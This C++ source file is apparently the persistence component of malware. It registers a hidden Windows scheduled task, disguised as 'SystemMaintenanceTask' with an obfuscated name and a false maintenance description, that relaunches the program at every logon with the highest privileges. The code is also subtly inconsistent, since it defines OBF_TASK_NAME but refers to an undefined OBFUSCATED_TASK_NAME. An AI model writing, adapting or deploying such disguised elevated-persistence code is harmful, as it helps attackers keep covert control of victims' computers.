#include "persistence/SchedulePersistence.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "utils/FileUtils.h"
#include "security/Obfuscation.h"
#include <string>
#include <vector>

#if PLATFORM_WINDOWS
#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
#endif

// Obfuscated strings
const auto OBF_SCHEDULE_PERSISTENCE = OBFUSCATE("SchedulePersistence");
const auto OBF_TASK_NAME = OBFUSCATE("SystemMaintenanceTask");
const auto OBF_TASK_DESC = OBFUSCATE("Performs system maintenance activities");

SchedulePersistence::SchedulePersistence(Configuration* config)
    : BasePersistence(config) {}

SchedulePersistence::~SchedulePersistence() {
#if PLATFORM_WINDOWS
    CoUninitialize();
#endif
}

bool SchedulePersistence::Install() {
    if (IsInstalled()) {
        return true;
    }

#if PLATFORM_WINDOWS
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        LOG_ERROR("COM initialization failed: " + std::to_string(hr));
        return false;
    }

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
    
    if (FAILED(hr)) {
        LOG_ERROR("COM security initialization failed: " + std::to_string(hr));
        CoUninitialize();
        return false;
    }

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pService);
    
    if (FAILED(hr)) {
        LOG_ERROR("Failed to create Task Scheduler instance: " + std::to_string(hr));
        CoUninitialize();
        return false;
    }

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        LOG_ERROR("Failed to connect to Task Scheduler: " + std::to_string(hr));
        pService->Release();
        CoUninitialize();
        return false;
    }

    bool success = CreateScheduledTask(pService);
    pService->Release();
    CoUninitialize();

    if (success) {
        m_installed = true;
        LOG_INFO("Scheduled task persistence installed successfully");
    }

    return success;
#else
    return false;
#endif
}

#if PLATFORM_WINDOWS
bool SchedulePersistence::CreateScheduledTask(ITaskService* pService) {
    ITaskFolder* pRootFolder = NULL;
    HRESULT hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        LOG_ERROR("Failed to get root task folder: " + std::to_string(hr));
        return false;
    }

    // Delete existing task if it exists
    pRootFolder->DeleteTask(_bstr_t(OBFUSCATED_TASK_NAME), 0);

    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) {
        LOG_ERROR("Failed to create new task definition: " + std::to_string(hr));
        pRootFolder->Release();
        return false;
    }

    // Set task settings
    ITaskSettings* pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (SUCCEEDED(hr)) {
        pSettings->put_StartWhenAvailable(VARIANT_TRUE);
        pSettings->put_Enabled(VARIANT_TRUE);
        pSettings->put_Hidden(VARIANT_TRUE);
        pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
        pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
        pSettings->Release();
    }

    // Set task principal
    IPrincipal* pPrincipal = NULL;
    hr = pTask->get_Principal(&pPrincipal);
    if (SUCCEEDED(hr)) {
        pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
        pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
        pPrincipal->Release();
    }

    // Create trigger (logon trigger)
    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (SUCCEEDED(hr)) {
        ITrigger* pTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
        if (SUCCEEDED(hr)) {
            ILogonTrigger* pLogonTrigger = NULL;
            hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
            if (SUCCEEDED(hr)) {
                pLogonTrigger->put_Enabled(VARIANT_TRUE);
                pLogonTrigger->Release();
            }
            pTrigger->Release();
        }
        pTriggerCollection->Release();
    }

    // Create action (execute our binary)
    IActionCollection* pActionCollection = NULL;
    hr = pTask->get_Actions(&pActionCollection);
    if (SUCCEEDED(hr)) {
        IAction* pAction = NULL;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        if (SUCCEEDED(hr)) {
            IExecAction* pExecAction = NULL;
            hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
            if (SUCCEEDED(hr)) {
                std::wstring exePath = utils::FileUtils::GetCurrentExecutablePath();
                pExecAction->put_Path(_bstr_t(exePath.c_str()));
                pExecAction->put_Arguments(_bstr_t(L""));
                pExecAction->Release();
            }
            pAction->Release();
        }
        pActionCollection->Release();
    }

    // Register the task
    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(OBFUSCATED_TASK_NAME),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask);

    pTask->Release();
    pRootFolder->Release();

    if (FAILED(hr)) {
        LOG_ERROR("Failed to register task: " + std::to_string(hr));
        return false;
    }

    pRegisteredTask->Release();
    return true;
}
#endif

bool SchedulePersistence::Remove() {
#if PLATFORM_WINDOWS
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        LOG_ERROR("COM initialization failed: " + std::to_string(hr));
        return false;
    }

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pService);

    if (FAILED(hr)) {
        LOG_ERROR("Failed to create Task Scheduler instance: " + std::to_string(hr));
        CoUninitialize();
        return false;
    }

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        LOG_ERROR("Failed to connect to Task Scheduler: " + std::to_string(hr));
        pService->Release();
        CoUninitialize();
        return false;
    }

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        LOG_ERROR("Failed to get root task folder: " + std::to_string(hr));
        pService->Release();
        CoUninitialize();
        return false;
    }

    hr = pRootFolder->DeleteTask(_bstr_t(OBFUSCATED_TASK_NAME), 0);
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();

    if (SUCCEEDED(hr)) {
        m_installed = false;
        LOG_INFO("Scheduled task persistence removed successfully");
        return true;
    }

    LOG_ERROR("Failed to remove scheduled task: " + std::to_string(hr));
    return false;
#else
    return false;
#endif
}

bool SchedulePersistence::IsInstalled() const {
#if PLATFORM_WINDOWS
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        return false;
    }

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pService);

    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return false;
    }

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return false;
    }

    IRegisteredTask* pTask = NULL;
    hr = pRootFolder->GetTask(_bstr_t(OBFUSCATED_TASK_NAME), &pTask);
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();

    if (SUCCEEDED(hr)) {
        pTask->Release();
        return true;
    }

    return false;
#else
    return false;
#endif
}